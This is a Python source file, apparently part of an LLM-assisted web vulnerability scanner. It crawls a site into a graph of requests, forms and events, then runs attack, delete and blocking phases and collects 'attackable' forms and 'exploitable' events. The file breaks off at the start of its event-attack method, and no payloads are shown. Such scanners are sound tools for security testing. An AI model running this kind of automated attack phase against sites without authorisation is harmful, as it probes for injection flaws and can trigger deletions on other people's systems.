import asyncio
import hashlib
from json import JSONEncoder
from lib2to3.fixes.fix_input import context
import sys

import transformers
from pkg_resources import resource_listdir
from seleniumwire import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import (StaleElementReferenceException,
                                        TimeoutException,
                                        UnexpectedAlertPresentException,
                                        NoSuchFrameException,
                                        NoAlertPresentException,
                                        WebDriverException,
                                        InvalidElementStateException
                                        )

from urllib.parse import urlparse, urljoin
import json
import pprint
import datetime
import tldextract
import math
import os
import traceback
import random
import re
import time
import itertools
import string

from torch.utils.hipify.hipify_python import bcolors

from Functions import *
from Navigation import DependencyGraph, Scheduler, Node
from extractors.Events import extract_events
from extractors.Forms import extract_forms, parse_form
from extractors.Urls import extract_urls
from extractors.Iframes import extract_iframes
from extractors.Ui_forms import extract_ui_forms
from selenium.webdriver.common.by import By

import logging

from llm_manager import LLMManager
from torch.utils.hipify.hipify_python import bcolors
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics.pairwise import cosine_similarity

timestamp = datetime.now().strftime('%Y-%m-%d-%H-%M-%S')
app_name = os.getenv("APP_NAME", "")
log_file = os.path.join(os.getcwd(), 'logs', app_name + '-crawl-' + str(timestamp) + '.log')
logging.basicConfig(filename=log_file,
                    format='%(asctime)s\t%(name)s\t%(levelname)s\t[%(filename)s:%(lineno)d]\t%(message)s',
                    datefmt='%Y-%m-%d:%H:%M:%S', level=logging.DEBUG)
# Turn off all other loggers that we don't care about.
for v in logging.Logger.manager.loggerDict.values():
    v.disabled = True

logging.getLogger('seleniumwire').setLevel(logging.WARNING)
logging.getLogger('hpack').setLevel(logging.WARNING)
logging.getLogger('urllib3').setLevel(logging.WARNING)
logging.getLogger('llm').setLevel(logging.ERROR)
RESULT_DIR = os.path.join(os.getcwd(), 'results')
if not os.path.exists(os.path.join(RESULT_DIR, app_name)):
    os.makedirs(os.path.join(RESULT_DIR, app_name))

class bcolors:
    if sys.stdout.isatty():
        HEADER = '\033[95m'
        OKBLUE = '\033[94m'
        OKCYAN = '\033[96m'
        OKGREEN = '\033[92m'
        WARNING = '\033[93m'
        FAIL = '\033[91m'
        ENDC = '\033[0m'
        BOLD = '\033[1m'
        UNDERLINE = '\033[4m'
    else:
        HEADER = ''
        OKBLUE = ''
        OKCYAN = ''
        OKGREEN = ''
        WARNING = ''
        FAIL = ''
        ENDC = ''
        BOLD = ''
        UNDERLINE = ''

class Request:
    def __init__(self, url, method):
        self.url = url
        self.method = method
        self.before_resource_operation = None
        self.after_resource_operation = None

    def set_before_resource_operation(self, resource_operation):
        self.before_resource_operation = resource_operation

    def set_after_resource_operation(self, resource_operation):
        self.after_resource_operation = resource_operation

    def __repr__(self):
        if not self:
            return "NO SELF IN REPR"

        ret = ""
        if not self.method:
            ret = ret + "[NO METHOD?] "
        else:
            ret = ret + "[" + self.method + "] "

        if not self.url:
            ret = ret + "[NO URL?]"
        else:
            ret = ret + self.url

        if self.after_resource_operation:
            ret = ret + " " + str(self.after_resource_operation)
        elif self.before_resource_operation:
            ret = ret + " " + str(self.before_resource_operation)

        return ret

    def __eq__(self, other):
        if isinstance(other, Request):
            ori_equal = False
            if self.method == other.method and self.method == "get":
                if are_urls_equivalent(self.url, other.url):
                    ori_equal = self.method == other.method
            else:
                ori_equal = self.method == other.method and self.url == other.url
            return ori_equal
        return False

    def __hash__(self):
        return hash(self.method)

    def dump(self):
        return {
            "url": self.url,
            "method": self.method,
            "before_resource_operation": self.before_resource_operation,
            "after_resource_operation": self.after_resource_operation
        }


class Graph:
    def __init__(self):
        self.nodes = []
        self.edges = []
        self.data = {}  # Metadata that can be used for anything
        self.visited_edges = []
        self.successful_edges = []
        self.successful_resource_operations = {}
        self.failed_edges = []
        self.failed_resource_operations = {}
        self.request_resource_operations = {}
        self.blocking_edges = []

    # Separate node class for storing meta data.
    class Node:
        def __init__(self, value):
            self.value = value
            self.visited = False

        def __repr__(self):
            return str(self.value)

        def __eq__(self, other):
            return self.value == other.value

        def __hash__(self):
            return self.value.__hash__()

        def dump(self):
            return {
                "value": self.value,
                "visited": self.visited
            }

    class Edge:
        def __init__(self, n1, n2, value, parent=None):
            self.n1 = n1
            self.n2 = n2
            self.value = value
            self.visited = False
            self.parent = parent
            self.depth = depth(self)

        def __eq__(self, other):
            return self.value == other.value

        def __hash__(self):
            return self.value.__hash__()

        def __repr__(self):
            return str(self.visited)+" "+str(self.value)

        def dump(self):
            return {
                "n1": self.n1,
                "n2": self.n2,
                "value": self.value,
                "visited": self.visited,
                "parent": str(self.parent),
                "depth": self.depth
            }

    def add(self, value):
        node = self.Node(value)
        for index, existing_node in enumerate(self.nodes):
            if existing_node == node:
                return False, index
        self.nodes.append(node)
        return True, len(self.nodes) - 1

    def create_edge(self, v1, v2, value, parent=None):
        n1 = self.Node(v1)
        n2 = self.Node(v2)
        edge = self.Edge(n1, n2, value, parent)
        for existing_edge in self.edges:
            if existing_edge == edge:
                return edge, True
        return edge, False

    def has_successful_edge(self, edge):
        if edge.value.before_resource_operation and edge.value.before_resource_operation != {}:
            method = edge.value.method
            resource = edge.value.before_resource_operation['resource']
            operation = edge.value.before_resource_operation['operation']
            CRUD_type = edge.value.before_resource_operation['CRUD_type']
            if resource != "unknown":
                if resource in self.successful_resource_operations:
                    if method in self.successful_resource_operations[resource]:
                        if operation in self.successful_resource_operations[resource][method]:
                            if CRUD_type in self.successful_resource_operations[resource][method][operation]:
                                if self.successful_resource_operations[resource][method][operation][CRUD_type]:
                                    return True
        for successful_edge in self.successful_edges:
            if successful_edge == edge:
                return True
        return False

    def get_failed_count(self, edge):
        if edge.value.before_resource_operation and edge.value.before_resource_operation != {}:
            method = edge.value.method
            resource = edge.value.before_resource_operation['resource']
            operation = edge.value.before_resource_operation['operation']
            CRUD_type = edge.value.before_resource_operation['CRUD_type']
            if resource in self.failed_resource_operations:
                if method in self.failed_resource_operations[resource]:
                    if operation in self.failed_resource_operations[resource][method]:
                        if CRUD_type in self.failed_resource_operations[resource][method][operation]:
                            return self.failed_resource_operations[resource][method][operation][CRUD_type]
        return 0

    def is_blocking(self, edge):
        if edge.value.before_resource_operation and edge.value.before_resource_operation!= {}:
            is_blocking = edge.value.before_resource_operation['CRUD_type']
            if is_blocking == "block":
                return True
        return False

    def is_unknown_resource(self, edge):
        if edge.value.before_resource_operation and edge.value.before_resource_operation!= {}:
            resource = edge.value.before_resource_operation['resource']
            if resource == "unknown":
                return True
        return False

    def connect(self, v1, v2, value, parent=None):
        n1 = self.Node(v1)
        n2 = self.Node(v2)
        edge = self.Edge(n1, n2, value, parent)

        p1 = False
        p2 = False
        for index, existing_node in enumerate(self.nodes):
            if existing_node == n1:
                p1 = True
            if existing_node == n2:
                p2 = True
        for index, existing_edge in enumerate(self.edges):
            if existing_edge == edge:
                return None
        if p1 and p2:
            self.edges.append(edge)
            return edge, len(self.edges) - 1
        return None

    def add_success(self, edge):
        self.successful_edges.append(edge)
        if edge.value.after_resource_operation and edge.value.after_resource_operation != {}:
            method = edge.value.method
            resource = edge.value.after_resource_operation['resource']
            operation = edge.value.after_resource_operation['operation']
            CRUD_type = edge.value.after_resource_operation['CRUD_type']
            if resource != "unknown":
                if resource not in self.successful_resource_operations:
                    self.successful_resource_operations[resource] = {}
                if method not in self.successful_resource_operations[resource]:
                    self.successful_resource_operations[resource][method] = {}
                if operation not in self.successful_resource_operations[resource][method]:
                    self.successful_resource_operations[resource][method][operation] = {}
                if CRUD_type not in self.successful_resource_operations[resource][method][operation]:
                    self.successful_resource_operations[resource][method][operation][CRUD_type] = 0
                self.successful_resource_operations[resource][method][operation][CRUD_type] += 1
        if edge.value.before_resource_operation and edge.value.before_resource_operation != {} and edge.value.before_resource_operation != edge.value.after_resource_operation:
            method = edge.value.method
            resource = edge.value.before_resource_operation['resource']
            operation = edge.value.before_resource_operation['operation']
            CRUD_type = edge.value.before_resource_operation['CRUD_type']
            if resource != "unknown":
                if resource not in self.failed_resource_operations:
                    self.failed_resource_operations[resource] = {}
                if method not in self.failed_resource_operations[resource]:
                    self.failed_resource_operations[resource][method] = {}
                if operation not in self.failed_resource_operations[resource][method]:
                    self.failed_resource_operations[resource][method][operation] = {}
                if CRUD_type not in self.failed_resource_operations[resource][method][operation]:
                    self.failed_resource_operations[resource][method][operation][CRUD_type] = 0
                self.failed_resource_operations[resource][method][operation][CRUD_type] += 1

    def add_failed(self, edge):
        self.failed_edges.append(edge)
        if edge.value.after_resource_operation and edge.value.after_resource_operation != {}:
            method = edge.value.method
            resource = edge.value.after_resource_operation['resource']
            operation = edge.value.after_resource_operation['operation']
            CRUD_type = edge.value.after_resource_operation['CRUD_type']
            if resource != "unknown":
                if resource not in self.failed_resource_operations:
                    self.failed_resource_operations[resource] = {}
                if method not in self.failed_resource_operations[resource]:
                    self.failed_resource_operations[resource][method] = {}
                if operation not in self.failed_resource_operations[resource][method]:
                    self.failed_resource_operations[resource][method][operation] = {}
                if CRUD_type not in self.failed_resource_operations[resource][method][operation]:
                    self.failed_resource_operations[resource][method][operation][CRUD_type] = 0
                self.failed_resource_operations[resource][method][operation][CRUD_type] += 1
        if edge.value.before_resource_operation and edge.value.before_resource_operation != {} and edge.value.before_resource_operation != edge.value.after_resource_operation:
            method = edge.value.method
            resource = edge.value.before_resource_operation['resource']
            operation = edge.value.before_resource_operation['operation']
            CRUD_type = edge.value.before_resource_operation['CRUD_type']
            if resource != "unknown":
                if resource not in self.failed_resource_operations:
                    self.failed_resource_operations[resource] = {}
                if method not in self.failed_resource_operations[resource]:
                    self.failed_resource_operations[resource][method] = {}
                if operation not in self.failed_resource_operations[resource][method]:
                    self.failed_resource_operations[resource][method][operation] = {}
                if CRUD_type not in self.failed_resource_operations[resource][method][operation]:
                    self.failed_resource_operations[resource][method][operation][CRUD_type] = 0
                self.failed_resource_operations[resource][method][operation][CRUD_type] += 1

    def add_blocking(self, edge):
        self.blocking_edges.append(edge)

    def visit_node(self, value):
        node = self.Node(value)
        if node in self.nodes:
            target = self.nodes[self.nodes.index(node)]
            target.visited = True
            return True
        return False

    def visit_edge(self, edge):
        self.visited_edges.append(edge)
        edge.visited = True

    def unvisit_edge(self, edge):
        if edge in self.edges:
            edge.visited = False
            return True
        return False

    def get_parents(self, value):
        node = self.Node(value)
        return [edge.n1.value for edge in self.edges if node == edge.n2]

    def __repr__(self):
        res = "---GRAPH---\n"
        for n in self.nodes:
            res += str(n) + " "
        res += "\n"
        for edge in self.edges:
            res += str(edge.n1) + " -(" + str(edge.value) + "[" + str(edge.visited) + "])-> " + str(edge.n2) + "\n"
        res += "\n---/GRAPH---"
        return res

    def dump(self):
        return {
            "nodes": self.nodes,
            "edges": [str(edge) for edge in self.edges],
            "data": self.data,
            "successful_edges": self.successful_edges,
            "successful_resource_operations": self.successful_resource_operations,
            "failed_edges": self.failed_edges,
            "failed_resource_operations": self.failed_resource_operations,
            "request_resource_operations": self.request_resource_operations,
            "blocking_edges": self.blocking_edges
        }


class Form:
    def __init__(self):
        self.action = None
        self.method = None
        self.inputs = {}
        self.a_tags = {}

    # Can we attack this form?
    def attackable(self):
        for input_el in self.inputs:
            if not input_el.itype:
                return True
            if input_el.itype in ["text", "password", "textarea", "iframe", "search"]:
                return True
        return False

    class Element:
        def __init__(self, itype, accessible_name, name, value):
            self.itype = itype
            self.accessible_name = accessible_name
            self.name = name
            self.value = value

        def __repr__(self):
            return str((self.itype, self.accessible_name, self.name, self.value))

        def __eq__(self, other):
            if self.accessible_name and self.name:
                return (self.itype == other.itype) and (self.accessible_name == other.accessible_name) and (
                    self.name == other.name)
            if self.accessible_name:
                return (self.itype == other.itype) and (self.accessible_name == other.accessible_name)
            else :
                return (self.itype == other.itype) and (self.name == other.name)

        def __hash__(self):
            if self.accessible_name and self.name:
                return hash(hash(self.itype) + hash(self.accessible_name) + hash(self.name))
            if self.accessible_name:
                return hash(hash(self.itype) + hash(self.accessible_name))
            else:
                return hash(hash(self.itype) + hash(self.name))

        def dump(self):
            return {
                "itype": self.itype,
                "accessible_name": self.accessible_name,
                "name": self.name,
                "value": self.value
            }

    class SubmitElement:
        def __init__(self, itype, accessible_name, name, value, use):
            self.itype = itype
            self.accessible_name = accessible_name
            self.name = name
            self.value = value
            # If many submit button are available, one must be picked.
            self.use = use

        def __repr__(self):
            return str((self.itype, self.accessible_name, self.name, self.value, self.use))

        def __eq__(self, other):
            if self.accessible_name and other.accessible_name and self.name and other.name:
                return ((self.itype == other.itype) and
                        (self.accessible_name == other.accessible_name) and
                        (self.name == other.name))
            if self.accessible_name and other.accessible_name:
                return ((self.itype == other.itype) and
                        (self.accessible_name == other.accessible_name))
            else:
                return ((self.itype == other.itype) and
                        (self.name == other.name))

        def __hash__(self):
            if self.accessible_name and self.name:
                return hash(hash(self.itype) + hash(self.accessible_name) + hash(self.name))
            if self.accessible_name:
                return hash(hash(self.itype) + hash(self.accessible_name))
            else:
                return hash(hash(self.itype) + hash(self.name))

        def dump(self):
            return {
                "itype": self.itype,
                "accessible_name": self.accessible_name,
                "name": self.name,
                "value": self.value,
                "use": self.use
            }

    class RadioElement:
        def __init__(self, itype, accessible_name, name, value):
            self.itype = itype
            self.accessible_name = accessible_name
            self.name = name
            self.value = value
            # Click is used when filling out the form
            self.click = False
            # User for fuzzing
            self.override_value = ""

        def __repr__(self):
            return str((self.itype, self.accessible_name, self.name, self.value, self.override_value))

        def __eq__(self, other):
            if self.accessible_name and self.name:
                p1 = (self.itype == other.itype)
                p2 = (self.accessible_name == other.accessible_name)
                p3 = (self.name == other.name)
                return p1 and p2 and p3
            p1 = (self.itype == other.itype)
            if self.accessible_name:
                p2 = (self.accessible_name == other.accessible_name)
            else:
                p2 = (self.name == other.name)
            return p1 and p2

        def __hash__(self):
            if self.accessible_name and self.name:
                return hash(hash(self.itype) + hash(self.accessible_name) + hash(self.name))
            if self.accessible_name:
                return hash(hash(self.itype) + hash(self.accessible_name))
            else:
                return hash(hash(self.itype)+hash(self.name))

        def dump(self):
            return {
                "itype": self.itype,
                "accessible_name": self.accessible_name,
                "name": self.name,
                "value": self.value,
                "click": self.click,
                "override_value": self.override_value
            }

    class SelectElement:
        def __init__(self, itype, accessible_name, name, selected):
            self.itype = itype
            self.accessible_name = accessible_name
            self.name = name
            self.options = []
            self.selected = selected
            self.override_value = ""

        def add_option(self, value, text):
            self.options.append([value, text])

        def __repr__(self):
            return str((self.itype, self.accessible_name, self.name, self.options, self.selected, self.override_value))

        def __eq__(self, other):
            if self.accessible_name and self.name:
                return (self.itype == other.itype) and (self.accessible_name == other.accessible_name) and (
                    self.name == other.name)
            if self.accessible_name:
                return (self.itype == other.itype) and (self.accessible_name == other.accessible_name)
            else:
                return (self.itype == other.itype) and (self.name == other.name)

        def __hash__(self):
            if self.accessible_name and self.name:
                return hash(hash(self.itype) + hash(self.accessible_name) + hash(self.name))
            if self.accessible_name:
                return hash(hash(self.itype) + hash(self.accessible_name))
            else:
                return hash(hash(self.itype) + hash(self.name))

        def dump(self):
            return {
                "itype": self.itype,
                "accessible_name": self.accessible_name,
                "name": self.name,
                "options": self.options,
                "selected": self.selected,
                "override_value": self.override_value
            }

    class CheckboxElement:
        def __init__(self, itype, accessible_name, name, value, checked):
            self.itype = itype
            self.accessible_name = accessible_name
            self.name = name
            self.value = value
            self.checked = checked
            self.override_value = ""

        def __repr__(self):
            return str((self.itype, self.accessible_name, self.name, self.value, self.checked))

        def __eq__(self, other):
            if self.accessible_name and self.name and self.checked:
                return (self.itype == other.itype) and (self.accessible_name == other.accessible_name) and (
                    self.name == other.name) and (self.checked == other.checked)
            if self.accessible_name:
                return (self.itype == other.itype) and (self.accessible_name == other.accessible_name) and (
                    self.checked == other.checked)
            else:
                return (self.itype == other.itype) and (self.name == other.name) and (self.checked == other.checked)

        def __hash__(self):
            if self.accessible_name and self.name and self.checked:
                return hash(hash(self.itype) + hash(self.accessible_name) + hash(self.name) + hash(self.checked))
            if self.accessible_name:
                return hash(hash(self.itype) + hash(self.accessible_name) + hash(self.checked))
            else:
                return hash(hash(self.itype) + hash(self.name) + hash(self.checked))

        def dump(self):
            return {
                "itype": self.itype,
                "accessible_name": self.accessible_name,
                "name": self.name,
                "value": self.value,
                "checked": self.checked,
                "override_value": self.override_value
            }

    # <select>
    def add_select(self, itype, accessible_name, name, selected):
        new_el = self.SelectElement(itype, accessible_name, name, selected)
        key = self.SelectElement(itype, accessible_name, name, None)
        self.inputs[key] = new_el
        return self.inputs[key]

    # <input>
    def add_input(self, itype, accessible_name, name, value, checked):
        if itype == "radio":
            new_el = self.RadioElement(itype, accessible_name, name, value)
            key = self.RadioElement(itype, accessible_name, name, '')
        elif itype == "checkbox":
            new_el = self.CheckboxElement(itype, accessible_name, name, value, checked)
            key = self.CheckboxElement(itype, accessible_name, name, value, None)
        elif itype == "submit":
            new_el = self.SubmitElement(itype, accessible_name, name, value, True)
            key = self.SubmitElement(itype, accessible_name, name, value, None)
        else:
            new_el = self.Element(itype, accessible_name, name, value)
            key = self.Element(itype, accessible_name, name, '')

        self.inputs[key] = new_el
        return self.inputs[key]

    # <button>
    def add_button(self, itype, accessible_name, name, value):
        if itype == "submit":
            new_el = self.SubmitElement(itype, accessible_name, name, value, True)
            key = self.SubmitElement(itype, accessible_name, name, value, None)
        else:
            new_el = self.Element(itype, accessible_name, name, value)
            key = self.Element(itype, accessible_name, name, value)

        self.inputs[key] = new_el
        return self.inputs[key]

    def add_a_tag(self, id_name, accessible_name):
        self.a_tags[id_name] = accessible_name
        return self.a_tags[id_name]

    # <textarea>
    def add_textarea(self, accessible_name, name, value):
        # Textarea functions close enough to a normal text element
        new_el = self.Element("textarea", accessible_name, name, value)
        self.inputs[new_el] = new_el
        return self.inputs[new_el]

    # <iframe>
    def add_iframe_body(self, id, accessible_name):
        new_el = self.Element("iframe", accessible_name, id, "")
        self.inputs[new_el] = new_el
        return self.inputs[new_el]

    def print(self):
        print("[form", self.action, self.method)
        for i in self.inputs:
            print("--", i)
        print("]")

    # For entire Form
    def __repr__(self):
        s = "Form(" + str(self.inputs.keys()) + ", " + str(self.action) + ", " + str(self.method) + ")"
        return s

    def __eq__(self, other):
        if other:
            return self.method == other.method and self.inputs == other.inputs
        return False

    def __hash__(self):
        return hash(hash(self.action) + hash(self.method) + hash(frozenset(self.inputs)))

    def dump(self):
        return {
            "action": self.action,
            "method": self.method,
            "inputs": str(self.inputs.keys())
        }

# JavaScript events, clicks, onmouse etc.
class Event:
    def __init__(self, fid, event, i, tag, addr, c, v):
        self.function_id = fid
        self.event = event
        self.id = i
        self.tag = tag
        self.addr = addr
        self.event_class = c
        self.is_visible = v

    def __repr__(self):
        s = "Event(" + str(self.event) + ", " + self.addr + ")"
        return s

    def __eq__(self, other):
        return (self.function_id == other.function_id and
                self.id == other.id and
                self.tag == other.tag and
                self.addr == other.addr)

    def __hash__(self):
        if self.tag == {}:
            logging.warning("Strange tag... %s " % str(self.tag))
            self.tag = ""

        if isinstance(self.id, dict):
            return hash(hash(self.function_id)+hash(self.tag)+hash(self.addr))

        return hash(hash(self.function_id) +
                    hash(self.id) +
                    hash(self.tag) +
                    hash(self.addr))

    def dump(self):
        return {
            "function_id": self.function_id,
            "event": str(self.event),
            "id": self.id,
            "tag": self.tag,
            "addr": str(self.addr),
            "event_class": self.event_class,
            "is_visible": self.is_visible
        }

class Iframe:
    def __init__(self, i, src):
        self.id = i
        self.src = src

    def __repr__(self):
        id_str = ""
        src_str = ""
        if self.id:
            id_str = "id=" + str(self.id)
        if self.src:
            src_str = "src=" + str(self.src)

        s = "Iframe(" + id_str + "," + src_str + ")"
        return s

    def __eq__(self, other):
        return (self.id == other.id and
                self.src == other.src
                )

    def __hash__(self):
        return hash(hash(self.id) +
                    hash(self.src)
                    )

    def dump(self):
        return {
            "id": self.id,
            "src": self.src
        }

class Ui_form:
    def __init__(self, sources, submit):
        self.sources = sources
        self.submit = submit

    def __repr__(self):
        return "Ui_form(" + str(self.sources) + ", " + str(self.submit) + ")"

    def __eq__(self, other):
        self_l = set([source['xpath'] for source in self.sources])
        other_l = set([source['xpath'] for source in other.sources])

        return self_l == other_l

    def __hash__(self):
        return hash(frozenset([source['xpath'] for source in self.sources]))

    def dump(self):
        return {
            "sources": self.sources,
            "submit": self.submit
        }

class Crawler:
    def __init__(self, driver, url, request_queue, analysis_queue, condition_signal, still_crawling_signal):
        self.root_req = None
        self.debug_mode = None
        self.driver = driver

        # Start url
        self.url = url
        self.graph = Graph()

        self.dependency_graph = DependencyGraph(self)

        self.scheduler = Scheduler(self.dependency_graph)

        self.session_id = str(time.time()) + "-" + str(random.randint(1, 10000000))

        # Used to track injections. Each injection will have a unique key.
        self.attack_lookup_table = {}

        # input / output graph
        self.io_graph = {}

        self.events_in_row = 0
        self.max_events_in_row = 15

        # Start with gets
        self.early_gets = 0
        self.max_early_gets = 100

        self.max_crawl_time = float(os.getenv("MAX_CRAWL_TIME", 60 * 60 * 8))

        self.max_reply_time = float(os.getenv("MAX_CRAWL_TIME", 60 * 60 * 8))

        self.start_time = 0.0

        self.llm_manager = LLMManager(os.getenv("API_KEY"), os.getenv("BASE_URL"), os.getenv("MODEL_NAME"))

        self.resource_operation = {}

        self.link_urls = []

        self.cookies = []

        self.still_work = True

        self.request_queue = request_queue

        self.analysis_queue = analysis_queue

        self.condition_signal = condition_signal

        self.still_crawling_signal = still_crawling_signal

        self.event_prompt_cache = []

        self.event_prompt_hash_cache = []

        self.app_name = os.getenv("APP_NAME", "")

        self.blocking_strings = [
            "del",
            "delete",
            "logout",
            "signout",
            "remove"
        ]

        self.tokenizer = transformers.AutoTokenizer.from_pretrained(
            os.getcwd(), trust_remote_code=True
        )

        self.semantic_cache = semantic_cache

        self.resource_parent_child_relationship = {}

        self.resource_child_parent_relationship = {}

        self.received_requests = set()
        self.received_requests.add(0)

        logging.info("Init crawl on " + url)

    async def start(self, debug_mode=False):
        self.root_req = Request("ROOTREQ", "get")
        req = Request(self.url, "get")
        self.graph.add(self.root_req)
        self.graph.add(req)
        self.graph.connect(self.root_req, req, CrawlEdge("get", None, None, None))
        self.debug_mode = debug_mode

        # Path deconstruction
        # TODO arg for this
        if not debug_mode:
            purl = urlparse(self.url)
            if purl.path:
                path_builder = ""
                for d in purl.path.split("/")[:-1]:
                    if d:
                        path_builder += d + "/"
                        tmp_purl = purl._replace(path=path_builder)
                        req = Request(tmp_purl.geturl(), "get")
                        self.graph.add(req)
                        self.graph.connect(self.root_req, req, CrawlEdge("get", None, None, None))

        self.graph.data['urls'] = {}
        self.graph.data['form_urls'] = {}
        open("run.flag", "w+").write("1")
        open("queue.txt", "w+").write("")
        open("command.txt", "w+").write("")

        random.seed(6)  # chosen by fair dice roll

        self.start_time = time.time()
        self.condition_signal.set()
        while self.still_work:
            elapsed_time = time.time() - self.start_time
            if elapsed_time > self.max_crawl_time:
                print(bcolors.OKGREEN+"Maximum crawl time reached, stopping crawler."+bcolors.ENDC)
                logging.info("Maximum crawl time reached, stopping crawler.")
                break

            print(bcolors.OKGREEN+"-----------------------------------"+bcolors.ENDC)
            new_edges = len([edge for edge in self.graph.edges if edge.visited == False])
            print(bcolors.OKGREEN+"Edges left: "+ str(new_edges)+bcolors.ENDC)
            try:
                if "0" in open("run.flag", "r").read():
                    logging.info("Run set to 0, stop crawling")
                    break
                if "2" in open("run.flag", "r").read():
                    logging.info("Run set to 2, pause crawling")
                    input("Crawler paused, press enter to continue")
                    open("run.flag", "w+").write("3")

                n_gets = 0
                n_forms = 0
                n_events = 0
                for edge in self.graph.edges:
                    if not edge.visited:
                        if edge.value.method == "get":
                            n_gets += 1
                        elif edge.value.method == "form":
                            n_forms += 1
                        elif edge.value.method == "event":
                            n_events += 1
                print()
                print(bcolors.OKGREEN+"----------------------"+bcolors.ENDC)
                print(bcolors.OKGREEN+"GETS    | FORMS  | EVENTS "+bcolors.ENDC)
                print(bcolors.OKGREEN+str(n_gets).ljust(7)+"|"+str(n_forms).ljust(6)+"|"+str(n_events)+bcolors.ENDC)
                print(bcolors.OKGREEN+"----------------------"+bcolors.ENDC)

                try:
                    self.still_work = await self.rec_crawl()
                except Exception as e:
                    self.still_work = n_gets + n_forms + n_events
                    print(bcolors.OKGREEN+str(e).splitlines()[0]+bcolors.ENDC)
                    print(bcolors.OKGREEN + "Top level error while crawling" + bcolors.ENDC)
                    logging.error(str(e).splitlines()[0])
                    logging.error("Top level error while crawling")

            except KeyboardInterrupt:
                print(bcolors.OKGREEN+"CTRL-C, abort mission"+bcolors.ENDC)
                logging.info("CTRL-C, abort mission")
                break

        self.still_crawling_signal.clear()

        print(bcolors.OKGREEN+"Done crawling, ready to attack!"+bcolors.ENDC)
        logging.info("Done crawling, ready to attack!")

        try:
            for edge in self.graph.edges:
                edge.visited = False

            self.attack()

            print(bcolors.OKGREEN+"Done attacking, ready to delete!"+bcolors.ENDC)

            self.attack_delete()

            print(bcolors.OKGREEN+"Done deleting, ready to blocking!"+bcolors.ENDC)
            self.attack_blocking()
        except Exception as e:
            print(bcolors.OKGREEN+str(e).splitlines()[0]+bcolors.ENDC)
            print(bcolors.OKGREEN + "Top level error while attacking" + bcolors.ENDC)
            logging.error(str(e).splitlines()[0])
            logging.error("Top level error while attacking")

        print(bcolors.OKGREEN+"pause"+bcolors.ENDC)

    def infer_resource_dependency_relationship(self, potential_parent_name, potential_parent_index_list, potential_child_name, potential_child_index_list):
        if potential_parent_name in self.resource_parent_child_relationship and potential_child_name in self.resource_parent_child_relationship[potential_parent_name]:
            return self.resource_parent_child_relationship[potential_parent_name][potential_child_name]
        if potential_child_name in self.resource_child_parent_relationship and potential_parent_name in self.resource_child_parent_relationship[potential_child_name]:
            if self.resource_child_parent_relationship[potential_child_name][potential_parent_name]:
                return False
        dependency_prompt = f"Resource A: {potential_parent_name}"
        for index in potential_parent_index_list:
            edge = self.graph.edges[index]
            dependency_prompt += f"\n{edge.value.before_prompt}"

        dependency_prompt += f"\nResource B: {potential_child_name}"
        for index in potential_child_index_list:
            edge = self.graph.edges[index]
            dependency_prompt += f"\n{edge.value.before_prompt}"
        start = time.time()
        formatted_start = datetime.fromtimestamp(start).strftime('%Y-%m-%d %H:%M:%S')
        print(bcolors.OKGREEN+"start inferring resource parent-child relationship "+str(formatted_start)+bcolors.ENDC)
        analysis = self.llm_manager.identify_resource_dependency_relationship(dependency_prompt)
        compensation_time = time.time() - start
        average_llm_time = int(os.getenv("AVERAGE_LLM_TIME", 5))
        if compensation_time > average_llm_time:
            self.max_crawl_time += compensation_time - average_llm_time
            self.max_crawl_time = min(self.max_crawl_time, 2 * float(os.getenv("MAX_CRAWL_TIME", 60 * 60 * 3)))
            print(bcolors.OKGREEN + "max_crawl_time " + str(self.max_crawl_time) + " compensation_time " + str(
                compensation_time) + bcolors.ENDC)
        dependency_relationship = analysis.get("parent-child relationship", False)
        print(bcolors.OKGREEN+"end inferring resource parent-child relationship "+str(time.time()-start)+bcolors.ENDC)
        print(bcolors.OKGREEN+"Resource parent-child relationship for "+str(potential_parent_name)+" and "+str(potential_child_name)+": "+str(dependency_relationship)+bcolors.ENDC)
        if potential_parent_name not in self.resource_parent_child_relationship:
            self.resource_parent_child_relationship[potential_parent_name] = {}
        if potential_child_name not in self.resource_parent_child_relationship[potential_parent_name]:
            self.resource_parent_child_relationship[potential_parent_name][potential_child_name] = dependency_relationship

        return dependency_relationship

    def extract_vectors(self, is_delete, is_blocking):
        print(bcolors.OKGREEN+"Extracting urls"+bcolors.ENDC)
        vectors = []
        added = set()

        exploitable_events = ["input", "oninput", "onchange", "compositionstart"]

        blocking_urls = set()
        delete_urls = set()

        for edge in self.graph.edges:
            if edge.value.method == "get":
                if edge.value.before_resource_operation and edge.value.before_resource_operation != {} and edge.value.before_resource_operation['CRUD_type'] == "block":
                    blocking_urls.add(edge.value.method_data)
                if edge.value.before_resource_operation and edge.value.before_resource_operation != {} and edge.value.before_resource_operation['CRUD_type'] == "delete":
                    delete_urls.add(edge.value.method_data)

        # GET
        for node in self.graph.nodes:
            if node.value.url != "ROOTREQ":
                purl = urlparse(node.value.url)
                if node.value.url and "#####" in node.value.url:
                    continue
                if purl.scheme[:4] == "http" and not node.value.url in added:
                    if not is_blocking and not node.value.url in blocking_urls:
                        if not is_delete and node.value.url not in delete_urls:
                            vectors.append(("get", node.value.url))
                            added.add(node.value.url)
                        if is_delete and node.value.url in delete_urls:
                            vectors.append(("get", node.value.url))
                            added.add(node.value.url)
                    elif is_blocking and node.value.url in blocking_urls:
                        vectors.append(("get", node.value.url))
                        added.add(node.value.url)

        # FORMS and EVENTS
        for edge in self.graph.edges:
            if is_blocking:
                if edge.value.before_resource_operation and edge.value.before_resource_operation!= {} and edge.value.before_resource_operation['CRUD_type'] != "block":
                    continue
            else:
                if edge.value.before_resource_operation and edge.value.before_resource_operation != {} and edge.value.before_resource_operation['CRUD_type'] == "block":
                    continue
                if not is_delete and edge.value.before_resource_operation and edge.value.before_resource_operation!= {} and edge.value.before_resource_operation['CRUD_type'] == "delete":
                    continue
                if is_delete and edge.value.before_resource_operation and edge.value.before_resource_operation!= {} and edge.value.before_resource_operation['CRUD_type'] != "delete":
                    continue
            method = edge.value.method
            method_data = edge.value.method_data
            if method == "get" and edge.value.method_data not in added:
                vectors.append(("get", edge.value.method_data))
            if method == "form":
                vectors.append(("form", edge))
                edge.visited = True
            if method == "event":
                event = method_data

                # check both for event and onevent, e.g input and oninput
                print(bcolors.OKGREEN+"ATTACK EVENT"+str(event)+bcolors.ENDC)
                if ((event.event in exploitable_events) or
                        ("on" + event.event in exploitable_events)):
                    if not event in added:
                        vectors.append(("event", edge))
                        edge.visited = True
                        added.add(event)

        return vectors

    def attack_event(self, driver, vector_edge):

